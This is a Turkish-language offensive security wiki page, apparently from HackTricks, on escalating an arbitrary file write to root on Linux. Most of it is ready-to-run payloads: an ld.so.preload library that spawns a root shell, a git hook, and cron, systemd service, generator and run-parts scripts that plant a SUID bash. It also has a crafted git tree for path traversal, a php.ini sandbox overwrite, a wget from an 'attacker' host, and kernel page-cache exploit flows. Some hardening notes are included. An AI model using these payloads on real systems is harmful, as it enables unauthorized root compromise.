# Root'a Arbitrary File Write

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload`, dynamic linker'ın diğer shared object'lerden önce yüklediği, sistem genelindeki shared object listesidir. Secure-execution mode, preloading için ek kısıtlamalar uygular; bu nedenle `/tmp/pe.so` gibi bir library path'i universal bir SUID-binary tekniği değildir.\
Bunu oluşturabilir veya değiştirebilirseniz, dosyayı yükleyen bir process, listelenen library'yi diğer shared object'lerinden önce yükler ve bu da o process'in context'i içinde code execution sağlar.<sup>[[12]](#references)</sup>

Örneğin: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks**, bir repository'deki commit ve merge işlemleri de dahil olmak üzere çeşitli olaylar için çalıştırılan executable scriptlerdir. **Privileged bir script veya user** bu işlemleri gerçekleştiriyorsa ve attacker **`.git` klasörüne yazabiliyorsa**, hook **privilege escalation** için kullanılabilir.<sup>[[13]](#references)</sup>

Örneğin, yeni bir commit oluşturulduğunda her zaman çalıştırılması için bir git repo'sunda **`.git/hooks`** içinde bir **script oluşturmak** mümkündür:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Privileged Git tree export path traversal

Ayrıcalıklı bir synchronizer, checkout gerçekleştirmek yerine saldırganın etkileyebildiği bir repository'yi `git ls-tree` ile listeleyebilir, her blob'u `git cat-file` ile okuyabilir, bildirilen pathname'i bir staging directory ile birleştirip dosyayı kendisi yazabilir. `-c safe.directory=*` seçeneğini (Git'in farklı sahipli repository korumasını devre dışı bırakır) destination containment check olmadan birleştirdiğinde bu durum **synchronizer'ın ayrıcalıklarıyla arbitrary file write** yapılmasına dönüşür. Mutlak bir tree-entry adı, Python'daki `os.path.join(stage, name)` işleminin `stage` değerini yok saymasına neden olur; `../` içeren göreli bir ad ise filesystem bunu çözümlerken dışarı çıkar. Uygulama raw tree'yi Git'ten checkout etmesini istemek yerine kendisi materialize ettiğinden, checkout-time pathname rejection hiçbir zaman sink'i korumaz.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Şu code shape'i root servislerinde, timer'larda, deployment agent'larında, template importer'larında ve backup/restore job'larında arayın:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Bir tree girdisi `<mode> SP <name> NUL <raw object ID>` olarak kodlanır. `git hash-object --literally` seçeneği, normal ayrıştırmanın veya `git fsck` komutunun reddedebileceği object verilerine kasıtlı olarak izin verir; bu nedenle geçici bir clone, dosya adı mutlak bir hedef olan bir tree oluşturabilir. Bu örnek bir cron-file blob'u oluşturur, hazırlanan tree'yi bir commit içine sarar ve bir branch'i buna taşır; exploitation için ayrıca ayrıcalıklı job tarafından kullanılan bir repository'yi güncelleme izni ve hatalı object'i kabul eden bir Git server gerekir.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Hardening hem repository alımını hem de son filesystem işlemini kapsamalıdır:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- `safe.directory=*` değerini servisin güvenmesi gereken tam repository'lerle değiştirin ve mümkün olduğunda repository işlemlerini root yetkileri olmadan gerçekleştirin.
- Materialization işleminden önce absolute adları ve herhangi bir `.` veya `..` bileşenini reddedin. Birleştirme işleminden sonra canonicalize edin ve hedefin amaçlanan root dizininin altında kaldığını doğrulayın.
- Check-then-open symlink race koşullarından kaçının: trusted bir directory descriptor'a göre relative olarak açın ve Linux'ta attacker-controlled path'ler için `RESOLVE_BENEATH` ile birlikte `RESOLVE_NO_SYMLINKS` kullanan `openat2()` işlevini kullanın.
- Plumbing output'tan checkout işlemini yeniden uygulamak yerine, isolated bir dizinde normal bir checkout gerçekleştirmeyi tercih edin. Raw-object ingestion gerekiyorsa `receive.fsckObjects=true` gibi receive-side validation seçeneklerini etkinleştirin; crafted tree'leri reddetmek için gereken pathname ile ilgili `receive.fsck.*` bulgularının seviyesini düşürmeyin.

### Cron ve Time dosyaları

**root'un çalıştırdığı cron ile ilgili dosyalara yazabiliyorsanız**, genellikle job bir sonraki çalıştığında code execution elde edebilirsiniz. İlginç hedefler şunlardır:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` veya `/var/spool/cron/crontabs/` altındaki root'un kendi crontab'ı
- `systemd` timer'ları ve tetikledikleri servisler

Hızlı kontroller:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Yaygın abuse yolları:

- `/etc/crontab` dosyasına veya `/etc/cron.d/` içindeki bir dosyaya **yeni bir root cron job eklemek**
- `run-parts` tarafından zaten çalıştırılan bir **script'i değiştirmek**
- Başlattığı script'i veya binary'yi değiştirerek **mevcut bir timer hedefini backdoor'lamak**

Minimal cron payload örneği:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Yalnızca `run-parts` tarafından kullanılan bir cron dizinine yazabiliyorsanız, bunun yerine oraya çalıştırılabilir bir dosya bırakın:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notlar:

- `run-parts` genellikle nokta içeren dosya adlarını yok sayar; bu nedenle `backup.sh` yerine `backup` gibi adları tercih edin.<sup>[[15]](#references)</sup>
- Bazı sistemler klasik cron yerine `systemd` timer'ları kullanır, ancak abuse fikri aynıdır: **root'un daha sonra çalıştıracağı şeyi değiştirmek**.<sup>[[20]](#references)</sup>

### Service & Socket dosyaları

**`systemd` unit dosyalarına** veya bunların referans verdiği dosyalara yazabiliyorsanız, unit'i yeniden yükleyip yeniden başlatarak ya da service/socket activation yolunun tetiklenmesini bekleyerek root olarak code execution elde edebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

İlginç hedefler:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` içindeki Drop-in override'lar
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` tarafından referans verilen service script'leri/binary'leri
- Bir root service tarafından yüklenen yazılabilir `EnvironmentFile=` yolları

Hızlı kontroller:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Yaygın abuse yolları:

- Değiştirebildiğiniz, root sahipli bir service unit içindeki **`ExecStart=`** değerinin üzerine yazın
- Kötü amaçlı bir **`ExecStart=`** içeren bir drop-in override ekleyin ve önce eski değeri temizleyin
- Unit tarafından zaten referans verilen script/binary dosyasına backdoor ekleyin
- Socket bir bağlantı aldığında başlayan ilgili `.service` dosyasını değiştirerek socket-activated service'i hijack edin

Kötü amaçlı override örneği:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipik etkinleştirme akışı:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Kendiniz servisleri yeniden başlatamıyorsanız ancak socket-activated bir unit'i düzenleyebiliyorsanız, backdoored service'ın root olarak çalışmasını tetiklemek için yalnızca **bir client bağlantısını beklemeniz** gerekebilir.<sup>[[17]](#references)</sup>

### systemd generator dizinleri

**System generators**, hem boot sırasında hem de configuration reload işlemlerinde, unit dosyalarını yüklemeden önce system manager tarafından başlatılan executable'lardır. Bu nedenle, bir system-generator dizinine (veya mevcut bir executable generator'a) yazma erişimi, yalnızca `*.service` ve `*.timer` dosyalarını kontrol eden bir audit sırasında kolayca gözden kaçabilecek, doğrudan bir root-code-execution primitive'idir.<sup>[[35]](#references)[[36]](#references)</sup>

Genel arama sırası `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` ve `/usr/lib/systemd/system-generators/` şeklindedir (bazı distribution'lar `/usr` merge aracılığıyla `/lib/systemd/system-generators/` dizinini sunar). Daha önceki bir dizinde aynı ada sahip bir executable, sonraki executable'ı shadow eder. Bu **input executable dizinlerini**, generator'lar tarafından üretilen transient unit output'unu içeren `/run/systemd/generator`, `/run/systemd/generator.early` ve `/run/systemd/generator.late` dizinleriyle karıştırmayın.<sup>[[35]](#references)</sup>

Hızlı kontroller:
```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
/usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
/lib/systemd/system-generators; do
[ -e "$d" ] || continue
namei -l "$d"
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
getfacl -p "$d" "$d"/* 2>/dev/null
done
```
Yeni oluşturulan bir generator’ın executable biti ayarlanmış olmalıdır. Write primitive baytları kontrol ediyor ancak mode’u kontrol etmiyorsa, zaten executable olan bir generator’ı hedefleyin; onu yerinde truncate etmek genellikle metadata’sını korur. Dizin yazılabilirse yeni bir entry oluşturup executable olarak işaretleyin.<sup>[[35]](#references)</sup>
```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```
`systemctl daemon-reload` komutunu **system** manager'a karşı tetiklemek uygun yetkilendirme gerektirir, ancak tüm system generator'larını yeniden çalıştırır; aksi durumda yetkili bir reload, package operation veya reboot beklenmelidir. `~/.config/systemd/user-generators/` gibi user-generator dizinleri user manager altında çalışır ve kendi başlarına root sağlamaz.<sup>[[35]](#references)</sup>

Hardening ve hunting için yalnızca son mode bitlerini değil, her path component'ini ve ACL'yi doğrulayın; generator'ların baseline hash'lerini ve package ownership bilgilerini oluşturun ve tüm system-generator input dizinlerindeki create, rename, content veya permission değişiklikleri için alert oluşturun. Bir one-shot generator execution sonrasında kendisini silebildiğinden, write işlemini monitoring etmek önemlidir; `/run/systemd/generator*` altındaki generated unit tree ise bir sonraki reload sırasında yeniden oluşturulur.<sup>[[35]](#references)[[36]](#references)</sup>

### Privileged PHP sandbox tarafından kullanılan kısıtlayıcı bir `php.ini` dosyasının üzerine yazma

Bazı custom daemon'lar, user-supplied PHP'yi **restricted `php.ini`** ile `php` çalıştırarak doğrular (örneğin, `disable_functions=exec,system,...`). Sandbox içindeki code hâlâ herhangi bir **write primitive**'e (örneğin `file_put_contents`) sahipse ve daemon tarafından kullanılan **exact `php.ini` path**'ine erişebiliyorsanız, restrictions'ı kaldırmak için bu config'in **üzerine yazabilir** ve ardından elevated privileges ile çalışan ikinci bir payload gönderebilirsiniz.<sup>[[2]](#references)</sup>

Typical flow:

1. İlk payload sandbox config'inin üzerine yazar.
2. Dangerous functions yeniden etkinleştirildikten sonra ikinci payload code çalıştırır.

Minimal example (daemon tarafından kullanılan path'i değiştirin):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Daemon root olarak çalışıyorsa (veya root sahipli yollarla doğrulama yapıyorsa), ikinci çalıştırma bir root context elde eder. Bu, sandboxed runtime hâlâ dosya yazabiliyorsa, esasen **config overwrite yoluyla privilege escalation** anlamına gelir.

### binfmt_misc

`binfmt_misc`, `/proc/sys/fs/binfmt_misc` altında registration'ları sunar; her registration, bir file-type pattern'ini bir interpreter ile ilişkilendirir. Privilege etkisi, registration'ı kimin değiştirebildiğine ve daha sonra matching file'ı hangi process'in çalıştırdığına bağlıdır; bu nedenle bunu bir privilege-escalation path'i olarak değerlendirmeden önce bu gereksinimleri doğrulayın.<sup>[[21]](#references)</sup>

### Schema handler'larını overwrite etme (http: veya https: gibi)

Desktop environment'lar, URI scheme'leri için bir application seçmek amacıyla MIME association'larını ve desktop entry'lerini kullanır; ilgili per-user configuration ve desktop-entry directory'lerine yazabilen bir attacker, bu scheme'leri kontrol ettiği bir launcher'a yönlendirebilir. `$HOME/.config/mimeapps.list` dosyasını, HTTP ve HTTPS URL handler'larını malicious bir file'a yönlendirecek şekilde değiştirerek (örneğin, `x-scheme-handler/http=evil.desktop` ve `x-scheme-handler/https=evil.desktop`), bir user click'i bu desktop entry'yi çağırabilir.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root tarafından çalıştırılan user-writable script/binary'ler

Ayrıcalıklı bir workflow `/bin/sh /home/username/.../script` gibi bir şeyi (veya unprivileged bir user'a ait bir dizinin içindeki herhangi bir binary'yi) çalıştırıyorsa bunu ele geçirebilirsiniz:<sup>[[1]](#references)</sup>

- **Çalıştırmayı tespit edin:** root'un user-controlled path'leri çağırdığını yakalamak için process'leri pspy ile izleyin.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Yazılabilirliği doğrula:** hem hedef dosyanın hem de dizininizin sahibi olduğundan ve kullanıcınız tarafından yazılabilir olduğundan emin olun.
- **Hedefi hijack et:** orijinal binary/script dosyasını yedekleyin ve SUID shell oluşturan bir payload (veya başka bir root işlemi) bırakın, ardından izinleri geri yükleyin:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Ayrıcalıklı eylemi tetikleyin** (ör. helper'ı oluşturan bir UI düğmesine basarak). Root, ele geçirilmiş yolu yeniden çalıştırdığında, yükseltilmiş shell'i `./rootshell -p` ile alın.

### Ayrıcalıklı binary'lerin yalnızca page cache'de dosya değiştirilmesi

Bazı kernel bug'ları dosyayı **disk üzerinde** değiştirmez. Bunun yerine yalnızca okunabilir bir dosyanın **page cache kopyasını** değiştirmenize olanak tanır. Bir **setuid** veya başka şekilde **root tarafından çalıştırılan** binary'yi hedefleyebilirseniz, sonraki çalıştırma bellekteki saldırgan kontrollü byte'ları işletebilir ve diskteki dosya hash'i değişmemiş olsa bile ayrıcalıkları yükseltebilir.<sup>[[3]](#references)[[4]](#references)</sup>

Bunu bir **yalnızca runtime'da geçerli dosya yazma primitive'i** olarak düşünmek faydalıdır:<sup>[[3]](#references)</sup>

- **Disk temiz kalır**: inode ve diskteki byte'lar değişmez
- **Bellek dirty olur**: cache'lenmiş sayfayı okuyan/çalıştıran process'ler saldırgan tarafından değiştirilmiş içeriği alır
- **Etki geçicidir**: değişiklik reboot veya cache eviction sonrasında kaybolur

Bu primitive, klasik **arbitrary file write** ile Dirty COW / Dirty Pipe gibi daha eski **page-cache abuse** bug'ları arasında yer alır:<sup>[[3]](#references)</sup>

- Dirty COW bir race koşuluna dayanıyordu
- Dirty Pipe yazma konumu kısıtlamalarına sahipti
- Bir page-cache-only primitive, vulnerable path cache'lenmiş file-backed page'lere doğrudan yazma sağlıyorsa daha güvenilir olabilir

#### Generic privesc flow

1. **file-backed page cache page'lerine** yazabilen bir kernel primitive'i elde edin
2. Bunu **okunabilir ayrıcalıklı bir binary'ye** veya root tarafından çalıştırılan başka bir dosyaya karşı kullanın
3. Page cache'den evicted edilmeden **önce** çalıştırmayı tetikleyin
4. Diskteki dosya hâlâ değiştirilmemiş görünürken root olarak code execution elde edin

Yüksek değerli tipik hedefler:

- **setuid-root** binary'leri
- **root service'leri** tarafından başlatılan helper'lar
- **host kernel/page cache'ini paylaşan container'larda** yaygın olarak çalıştırılan binary'ler

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) bu sınıfa iyi bir örnektir. Vulnerable path, Linux crypto userspace API'si (`AF_ALG` / `algif_aead`) içindeydi:<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()`, page-cache page'lerine ait referansları okunabilir bir dosyadan crypto TX scatterlist'ine taşıyabilir
- in-place `algif_aead` decrypt path'i source ve destination buffer'larını yeniden kullandı
- ardından `authencesn`, destination tag bölgesine yazdı
- bu bölge hâlâ spliced file-backed page'lere referans veriyorsa yazma, **hedef dosyanın page cache'ine** gerçekleşti

Dolayısıyla ilginç olan technique CVE'nin kendisi değil, şu pattern'dir:

- **file-backed cache page'lerini bir kernel subsystem'ine beslemek**
- subsystem'in bunları **yazılabilir output olarak değerlendirmesini** sağlamak
- bellekte küçük ve kontrollü bir overwrite tetiklemek

Public PoC, bellekte `/usr/bin/su` dosyasını patch'lemek ve ardından çalıştırmak için tekrarlanan **4-byte write** işlemleri kullandı.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503), aynı **page-cache-only write-to-root** pattern'inin başka bir varyantını gösterir; ancak bu kez sink, `AF_ALG` yerine **IPsec ESP decrypt** işlemidir.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Buradaki önemli technique, **metadata-laundering adımıdır**:

- `splice()`, **read-only file-backed page-cache page'ini** bir ESP-in-UDP packet'ine yerleştirir
- orijinal DirtyFrag mitigation, `esp_input()` decrypt işleminden önce **copy** yapsın diye skb'yi `SKBFL_SHARED_FRAG` ile işaretledi
- netfilter `TEE`, packet'i `nf_dup_ipv4()` -> `__pskb_copy_fclone()` üzerinden çoğaltır
- clone, **aynı physical page-cache referansını** korur ancak `SKBFL_SHARED_FRAG` değerini kaybeder
- ardından `esp_input()`, clone'u güvenli kabul eder ve file-backed page üzerinde **in-place `cbc(aes)` decrypt** çalıştırır

Dolayısıyla reviewer dersi CVE'den daha geneldir: Bir mitigation, bir operation'ın önce copy yapması gerekip gerekmediğine karar vermek için **skb/page metadata'sına** güveniyorsa, backing page'i koruyup metadata'yı düşüren herhangi bir **clone/copy path'i**, write primitive'ini fark edilmeden yeniden açabilir.

Tipik exploitation flow:

1. **Özel bir network namespace içinde `CAP_NET_ADMIN`** elde etmek için `unshare(CLONE_NEWUSER | CLONE_NEWNET)` kullanın
2. loopback'i etkinleştirin ve `mangle/OUTPUT` içine bir **netfilter `TEE` rule'u** yükleyin
3. `NETLINK_XFRM` aracılığıyla **XFRM ESP transport SA'larını** yükleyin
4. Her hedef 4-byte word'ü SA `seq_hi` field'ında encode edin (DirtyFrag'in word-selection trick'i)
5. **TEE clone'un** `esp_input()`'e ulaşmasını ve **in place** decrypt gerçekleştirmesini sağlamak için spliced ESP-in-UDP packet'ini gönderin
6. `/usr/bin/su` veya başka bir privileged executable'ın page-cache kopyası saldırgan kontrollü code içerene kadar tekrarlayın

Operasyonel olarak etki, `AF_ALG` example'ı ile aynıdır: diskteki dosya temiz kalır, ancak `execve()` **değiştirilmiş page-cache byte'larını** kullanır ve root elde edilir.<sup>[[8]](#references)[[9]](#references)</sup>

Bu varyant için faydalı exposure kontrolleri:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Kısa vadeli attack-surface reduction burada da path-specific'tir: `48f6a5356a33` taşıyan bir kernel'e upgrade etmek clone path'ini düzeltirken, `xt_TEE` autoload'unu engellemek **flag-laundering step**'ini ortadan kaldırır ve `esp4` / `esp6`'yı engellemek **decrypt sink**'ini kaldırır.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure ve hunting

Bu bug sınıfından şüpheleniyorsanız yalnızca disk integrity checks'e güvenmeyin. Ayrıca şunları doğrulayın:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Aşağıdaki yapılandırma değerleri, loadable bir interface ile kernel içine built-in olan bir interface'i birbirinden ayırır; crypto build rules, `CONFIG_CRYPTO_USER_API_AEAD` değerini `algif_aead` ile eşler.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead`, bir module olarak loadable/unloadable olabilir
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface kernel içine built-in olarak dahil edilir
- setuid binary'leri iyi hedeflerdir; çünkü yalnızca page-cache tabanlı bir patch, local foothold'u root yetkisine yükseltmek için yeterli olabilir

#### `algif_aead` path'i için attack-surface reduction

Vulnerable interface, loadable bir module tarafından sağlanıyorsa:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Çekirdeğe derlenmişse, bazı disclosure'lar init path'inin şu şekilde engellendiğini bildirmiştir:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Bu tür bir mitigation, diğer kernel LPE'leri için de hatırlanmaya değerdir: exploitation belirli bir optional interface'e bağlıysa, bu interface'i devre dışı bırakmak veya blacklist'e almak, tam bir kernel upgrade'i kullanılabilir olmadan önce bile exploit yolunu kesebilir.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – user-writable PaperCut dizininde root tarafından çalıştırılan bir script'i ele geçirme](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) SSS](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431 için Openwall oss-security açıklaması](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable düzeltmesi: crypto: algif_aead - out-of-place çalışmaya geri dön](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint teknik writeup'ı](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE varyantı DirtyClone'u (CVE-2026-43503) analiz etme ve exploitation](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux düzeltmesi: net: skb: `__pskb_copy_fclone()` içinde `SKBFL_SHARED_FRAG` değerini koru (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux'taki önceki mitigation: splice edilmiş UDP paketleri için `SKBFL_SHARED_FRAG` ayarla (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` documentation](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` documentation](https://git-scm.com/docs/git-ls-tree)
- [33] [Git configuration documentation](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux manual page](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd generator documentation](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: persistence mechanisms](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
